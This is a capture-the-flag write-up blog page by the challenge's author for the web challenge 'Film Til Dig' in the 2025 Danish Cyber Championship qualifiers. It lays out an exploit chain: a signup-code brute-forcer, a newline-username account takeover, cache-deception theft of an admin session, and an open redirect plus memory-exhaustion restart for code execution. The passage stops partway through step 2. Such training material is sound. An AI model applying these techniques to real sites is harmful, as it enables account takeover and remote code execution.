<!DOCTYPE html>
<html lang="en"
  dir="ltr">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">



<link rel="icon" type="image/ico" href="http://localhost:1313//favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313//favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313//favicon-32x32.png">
<link rel="icon" type="image/png" sizes="192x192" href="http://localhost:1313//android-chrome-192x192.png">
<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313//apple-touch-icon.png">

<meta name="description" content=""/>



<title>
    
    Legacy - De Danske Cybermesterskaber 2025 - Qualifiers - Film Til Dig | 0xlime Blog
    
</title>

<link rel="canonical" href="http://localhost:1313/posts/film-til-dig/"/>

<meta property="og:url" content="http://localhost:1313/posts/film-til-dig/">
  <meta property="og:site_name" content="0xlime Blog">
  <meta property="og:title" content="Legacy - De Danske Cybermesterskaber 2025 - Qualifiers - Film Til Dig">
  <meta property="og:description" content="Film Til Dig # Preface # I was asked to create a hard web challenge for this years qualifiers for De Danske Cybermesterskaber, I am every year so excited for this event and to see the young brilliant Danish minds and their hacking capabilities. Since I only do web I wanted to get something down that would be a challenge to most, and get at most 10 solves, which seemd to succeeed across categories (Junior, Senior, Open, Nordics). So if you are here because you struggled with the challenge, thanks for spending time on it, it is really a cool experience to create something that someone else spends time on.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-14T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-14T00:00:00+00:00">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Ddc">













<link rel="stylesheet" href="/assets/combined.min.fd3f4cb85e34aebba7c667aea69c917d780622229c0923af8d8b323a6630eb1e.css" media="all">





</head>





<body class="auto">

  <div class="content">
    <header>
      

<div class="header">

    

    <h1 class="header-title">
        <a href="http://localhost:1313/">0xlime Blog</a>
    </h1>

    <div class="flex">
        

        
        
      
        <p class="small ">
            <a href="/" >
                /home
            </a>
        </p>
        
      
        <p class="small ">
            <a href="/posts" >
                /posts
            </a>
        </p>
        
      
        <p class="small ">
            <a href="https://r4.dk" >
                /about
            </a>
        </p>
        
        
    </div>

    

</div>

    </header>

    <main class="main">
      





<div class="breadcrumbs">
    
    <a href="/">Home</a>
    <span class="breadcrumbs-separator"> > </span>
    
    <a href="/posts/">Posts</a>
    <span class="breadcrumbs-separator"> > </span>
    
    <a class="breadcrumbs-current" href="/posts/film-til-dig/">Legacy - De Danske Cybermesterskaber 2025 - Qualifiers - Film Til Dig</a>
</div>



<div >

  <div class="single-intro-container">

    

    <h1 class="single-title">Legacy - De Danske Cybermesterskaber 2025 - Qualifiers - Film Til Dig</h1>
    

    

    <p class="single-readtime">
      
      
      
      <time datetime="2025-03-14T00:00:00&#43;00:00">March 14, 2025</time>
      

      
    </p>

  </div>

  

  

  

  

  <div class="single-content">
    <h1 class="heading" id="film-til-dig">
  Film Til Dig
  <a class="anchor" href="#film-til-dig">#</a>
</h1>
<h2 class="heading" id="preface">
  Preface
  <a class="anchor" href="#preface">#</a>
</h2>
<p>I was asked to create a <code>hard</code> web challenge for this years qualifiers for De Danske Cybermesterskaber, I am every year so excited for this event and to see the young brilliant Danish minds and their hacking capabilities. Since I only do <code>web</code> I wanted to get something down that would be a challenge to most, and get at most 10 solves, which seemd to succeeed across categories (<em>Junior</em>, <em>Senior</em>, <em>Open</em>, <em>Nordics</em>). So if you are here because you struggled with the challenge, thanks for spending time on it, it is really a cool experience to create something that someone else spends time on.</p>
<h2 class="heading" id="solves">
  Solves
  <a class="anchor" href="#solves">#</a>
</h2>
<p>The first person to solve <code>part 1</code> and <code>part 2</code> of the challenge was no other than <code>asp</code>, and when you have to chill and watch a movie, you also need pizza, so I of course sent him a gift card to get a pizza so he could chill out (<em>spoiler</em>: he did not chill out).</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="alt text" src="/posts/film-til-dig/image-5.png" width="971px" height="756px">
    </div>

    
</figure>
</p>
<p>The overall solves on the challenge was the following:</p>
<h2 class="heading" id="summary">
  Summary
  <a class="anchor" href="#summary">#</a>
</h2>
<p>This challenge required a multi-stage exploitation chain that begins with user registration by reversing the signup code verification. After gaining a low priv user access, the exploit leverages a username/password update vulnerability where adding a newline character after a valid email address allows changing the moderator&rsquo;s password, this is due to a bad regex and stripping of newlines in the update functionality. Using the compromised moderator account, it is possible to exploit a cache deception vulnerability where Varnish caches all .css files, enabling them to steal the admin&rsquo;s session token by making the admin bot visit a specific endpoint through reporting of reviews.</p>
<p>With admin access, it is possible to retrieve a flag hidden in a user&rsquo;s username through the admin panel <strong>First flag in house, wuhuuu</strong>.</p>
<p>The second flag is obtained by misusing an open redirect in the <code>impersonate</code> functionality and making the admin bot visit it, this allows you to send the admin bot to your controlled server, where you can make it download files directly to the root directory. After enabling experimental features, you can direct the admin through the open redirect to visit your own web server containing a large html file, since superlance will restart flask when it sees the high memory consumption, the app will be refreshed and the malicious downloaded python module will be included.</p>
<p>To summarize to get part 1 and part 2 you would need to do the following:</p>
<ol>
<li>
<p>Initial Access</p>
<ul>
<li>Register account using signup code <code>aar~-000q-022</code></li>
<li>Login with new account credentials</li>
</ul>
</li>
<li>
<p>Privilege Escalation to Moderator</p>
<ul>
<li>Update own username to <code>moderator@movie-review.local\n</code> and password to <code>a</code></li>
<li>This changes moderator&rsquo;s password to <code>a</code></li>
<li>Login as moderator</li>
</ul>
</li>
<li>
<p>Admin Token Theft</p>
<ul>
<li>Make admin bot visit <code>/api/user/me.css</code></li>
<li>Retrieve cached response containing admin session token</li>
<li>Set admin session token in cookies</li>
<li>See the first flag</li>
</ul>
</li>
<li>
<p>Planting a malicious .py file in the root directory</p>
<ul>
<li>Enable experimental features as admin</li>
<li>Setup a HTTPS server serving a html file and malicious Python payload, use a self signed cert.</li>
<li>Make the admin bot visit the impersonation experimental feature, which allows open redirect to your server.</li>
<li>Force download a malicious <code>html.py</code>  file by serving the file with a <code>content-disposition</code> header set.</li>
</ul>
</li>
<li>
<p>Crashing flask so the malicious <code>html.py</code> is loaded.</p>
<ul>
<li>Use the open redirect to send the bot to your <code>/index.html</code> Which contains a <code>&lt;p&gt;</code> element with 250 mb characters in it.</li>
<li>Wait for <code>superlance</code> to see that the <code>flask</code> application uses too much memory and force restart to execute malicious code from the downloaded <code>html.py</code></li>
<li>Retrieve second flag from /static/flag.css</li>
</ul>
</li>
</ol>
<h2 class="heading" id="detailed-writeup">
  Detailed writeup
  <a class="anchor" href="#detailed-writeup">#</a>
</h2>
<p>First things first, in this writeup I will be using the hostname <code>site.local</code> instead of the hostname used on <strong>campfire platform</strong>. Just to get that confusion out of the way.</p>
<p>So we get a bunch of files after downloading the handout:</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="alt text" src="/posts/film-til-dig/image.png" width="417px" height="443px">
    </div>

    
</figure>
</p>
<p>It is clear from the code that there is a user separation, giving 3 types of users: <code>user</code>, <code>moderator</code> and <code>admin</code>. The first flag is placed as username for one user that only the administrator can see, and the second flag is placed in the <code>/root</code> folder with a random name. The goal is to get to <code>admin</code> level and then <code>rce</code>.</p>
<h2 class="heading" id="step-1---breaking-the-signup-code">
  Step 1 - Breaking the signup code
  <a class="anchor" href="#step-1---breaking-the-signup-code">#</a>
</h2>
<p>So just visiting the site we spot that we can create an account.</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="alt text" src="/posts/film-til-dig/image-1.png" width="1230px" height="882px">
    </div>

    
</figure>
</p>
<p>But we need a <code>signup code</code>, so we find the relevant part of the code handling this in <code>src/utils.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># utils.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">verify_secret_code</span>(code: <span style="color:#8be9fd;font-style:italic">str</span>) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">bool</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> code <span style="color:#ff79c6">or</span> <span style="color:#8be9fd;font-style:italic">len</span>(code) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">13</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> code[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;-&#39;</span> <span style="color:#ff79c6">or</span> code[<span style="color:#bd93f9">9</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;-&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    part1 <span style="color:#ff79c6">=</span> code[<span style="color:#bd93f9">0</span>:<span style="color:#bd93f9">4</span>]
</span></span><span style="display:flex;"><span>    part2 <span style="color:#ff79c6">=</span> code[<span style="color:#bd93f9">5</span>:<span style="color:#bd93f9">9</span>]
</span></span><span style="display:flex;"><span>    part3 <span style="color:#ff79c6">=</span> code[<span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">13</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        nums1 <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> part1]
</span></span><span style="display:flex;"><span>        nums2 <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> part2]
</span></span><span style="display:flex;"><span>        nums3 <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> part3]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        product <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> num <span style="color:#ff79c6">in</span> nums1:
</span></span><span style="display:flex;"><span>            product <span style="color:#ff79c6">*=</span> num
</span></span><span style="display:flex;"><span>        number <span style="color:#ff79c6">=</span> product<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> number <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">133333337</span> <span style="color:#ff79c6">or</span> <span style="color:#ff79c6">not</span> is_prime(number):
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        result <span style="color:#ff79c6">=</span> nums2[<span style="color:#bd93f9">0</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> num <span style="color:#ff79c6">in</span> nums2[<span style="color:#bd93f9">1</span>:]:
</span></span><span style="display:flex;"><span>            result <span style="color:#ff79c6">^=</span> num
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> result <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x41</span> <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        product <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> num <span style="color:#ff79c6">in</span> nums3:
</span></span><span style="display:flex;"><span>            product <span style="color:#ff79c6">*=</span> num
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> product <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">20000</span> <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> ValueError <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span></code></pre></div><p>Its a list of conditions that need to be met, we need to provide a token with the format <code>XXXX-YYYY-ZZZ</code>:</p>
<ol>
<li>
<p><strong>First part (XXXX)</strong>:</p>
<ul>
<li>The product of ASCII values + 1 must be ≥ 133,333,337 and prime</li>
</ul>
</li>
<li>
<p><strong>Second part (YYYY)</strong>:</p>
<ul>
<li>XORing all ASCII values must equal 0x41 (ASCII for &lsquo;A&rsquo;)</li>
</ul>
</li>
<li>
<p><strong>Third part (ZZZ)</strong>:</p>
<ul>
<li>The product of ASCII values must be divisible by 20,000</li>
</ul>
</li>
</ol>
<p>There is not much more to this part, I personally just wrote a script that would bruteforce the 3 parts separately:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># generate_signup_code.py</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> math <span style="color:#ff79c6">import</span> isqrt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> itertools
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">is_prime</span>(n: <span style="color:#8be9fd;font-style:italic">int</span>) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">bool</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Only check odd numbers up to square root</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>, isqrt(n) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">%</span> i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">gen_valid_code_1</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    candidates <span style="color:#ff79c6">=</span> string<span style="color:#ff79c6">.</span>printable[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> combo <span style="color:#ff79c6">in</span> itertools<span style="color:#ff79c6">.</span>product(candidates, repeat<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>):
</span></span><span style="display:flex;"><span>        part1 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(combo)
</span></span><span style="display:flex;"><span>        nums1 <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> part1]
</span></span><span style="display:flex;"><span>        product <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> num <span style="color:#ff79c6">in</span> nums1:
</span></span><span style="display:flex;"><span>            product <span style="color:#ff79c6">*=</span> num
</span></span><span style="display:flex;"><span>        number <span style="color:#ff79c6">=</span> product <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> number <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">133333337</span> <span style="color:#ff79c6">and</span> is_prime(number):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(number)
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;part1: </span><span style="color:#f1fa8c">{</span>part1<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> part1
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">gen_valid_code_2</span>():
</span></span><span style="display:flex;"><span>    candidates <span style="color:#ff79c6">=</span> string<span style="color:#ff79c6">.</span>printable[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> combo <span style="color:#ff79c6">in</span> itertools<span style="color:#ff79c6">.</span>product(candidates, repeat<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>):
</span></span><span style="display:flex;"><span>        part2 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(combo)
</span></span><span style="display:flex;"><span>        nums2 <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> part2]
</span></span><span style="display:flex;"><span>        result <span style="color:#ff79c6">=</span> nums2[<span style="color:#bd93f9">0</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> num <span style="color:#ff79c6">in</span> nums2[<span style="color:#bd93f9">1</span>:]:
</span></span><span style="display:flex;"><span>            result <span style="color:#ff79c6">^=</span> num
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> result <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">0x41</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;part2: </span><span style="color:#f1fa8c">{</span>part2<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> part2
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">gen_valid_code_3</span>():
</span></span><span style="display:flex;"><span>    candidates <span style="color:#ff79c6">=</span> string<span style="color:#ff79c6">.</span>printable[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> combo <span style="color:#ff79c6">in</span> itertools<span style="color:#ff79c6">.</span>product(candidates, repeat<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>):
</span></span><span style="display:flex;"><span>        part3 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(combo)
</span></span><span style="display:flex;"><span>        nums3 <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">ord</span>(x) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> part3]
</span></span><span style="display:flex;"><span>        product <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> num <span style="color:#ff79c6">in</span> nums3:
</span></span><span style="display:flex;"><span>            product <span style="color:#ff79c6">*=</span> num
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> product <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">20000</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;part3: </span><span style="color:#f1fa8c">{</span>part3<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> part3
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>code <span style="color:#ff79c6">=</span> gen_valid_code_1() <span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;-&#34;</span><span style="color:#ff79c6">+</span>gen_valid_code_2()<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;-&#34;</span><span style="color:#ff79c6">+</span>gen_valid_code_3()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(code)
</span></span></code></pre></div><p>Which when ran generated a valid code: <code>aar~-000q-022</code>, so now it was possible to sign up with a username <code>abe</code>! Let&rsquo;s go!</p>
<video autoplay loop muted playsinline controls>
  <source src="/logging_in.webm" type="video/webm">
  Your browser does not support the video tag.
</video>
<h2 class="heading" id="step-2---breaking-the-email-regex-to-become-a-moderator">
  Step 2 - Breaking the email regex to become a moderator
  <a class="anchor" href="#step-2---breaking-the-email-regex-to-become-a-moderator">#</a>
</h2>
<p>After gaining access as a user, we spot that we can now make reviews on the movies and also update our user setting, taking a look at the api endpoint for updating user settings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#app.py</span>
</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#34;/api/update_user&#34;</span> , methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span>@require_role([<span style="color:#f1fa8c">&#39;user&#39;</span>, <span style="color:#f1fa8c">&#39;moderator&#39;</span>, <span style="color:#f1fa8c">&#39;admin&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">update_user</span>():
</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>get_json()
</span></span><span style="display:flex;"><span>    new_username <span style="color:#ff79c6">=</span> data<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;username&#39;</span>, <span style="color:#ff79c6">None</span>)
</span></span><span style="display:flex;"><span>    new_password <span style="color:#ff79c6">=</span> data<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;password&#39;</span>, <span style="color:#ff79c6">None</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> new_username <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span> <span style="color:#ff79c6">and</span> new_password <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;No changes requested&#39;</span>}), <span style="color:#bd93f9">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> new_username <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> validate_email(new_username):
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;Invalid email address&#39;</span>}), <span style="color:#bd93f9">400</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;movies.db&#39;</span>)
</span></span><span style="display:flex;"><span>        c <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>        c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM users WHERE username = ?&#34;</span>, (new_username,))
</span></span><span style="display:flex;"><span>        user <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span>fetchone()
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> user <span style="color:#ff79c6">and</span> user[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">!=</span> session[<span style="color:#f1fa8c">&#39;username&#39;</span>]:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;error&#39;</span>: <span style="color:#f1fa8c">&#39;Username already taken&#39;</span>}), <span style="color:#bd93f9">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;movies.db&#39;</span>)
</span></span><span style="display:flex;"><span>        c <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>        c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE users SET username = ? WHERE username = ?&#34;</span>, (new_username<span style="color:#ff79c6">.</span>strip(), session[<span style="color:#f1fa8c">&#39;username&#39;</span>]))
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>commit()
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        session[<span style="color:#f1fa8c">&#39;username&#39;</span>] <span style="color:#ff79c6">=</span> new_username<span style="color:#ff79c6">.</span>strip()
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> new_password <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#ff79c6">=</span> hashlib<span style="color:#ff79c6">.</span>sha1(new_password<span style="color:#ff79c6">.</span>encode())<span style="color:#ff79c6">.</span>hexdigest()
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;movies.db&#39;</span>)
</span></span><span style="display:flex;"><span>        c <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>        c<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE users SET password = ? WHERE username = ?&#34;</span>, (hashed_password, session[<span style="color:#f1fa8c">&#39;username&#39;</span>]))
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>commit()
</span></span><span style="display:flex;"><span>        conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#39;success&#39;</span>: <span style="color:#ff79c6">True</span>})
</span></span></code></pre></div><p>There is some funky functionality going on here, it is apparantly possible to change your username AND password in the same request, this is juicy. If we provide <strong>both a username and password</strong> then we will change our users email to the new email, then update the password of the new email&hellip;</p>
<p>We know this line from the db shema:</p>
